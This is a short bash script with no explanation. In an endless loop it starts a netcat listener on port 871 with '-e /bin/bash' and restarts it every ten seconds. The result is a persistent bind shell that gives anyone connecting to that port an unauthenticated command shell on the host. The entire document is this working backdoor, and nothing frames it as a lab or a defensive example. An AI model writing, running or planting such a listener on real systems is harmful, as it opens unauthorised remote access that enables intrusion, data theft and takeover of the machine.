#!/bin/bash

while true; do
  until nc -nvlp 871 -e /bin/bash; do
    sleep 10
  done
done
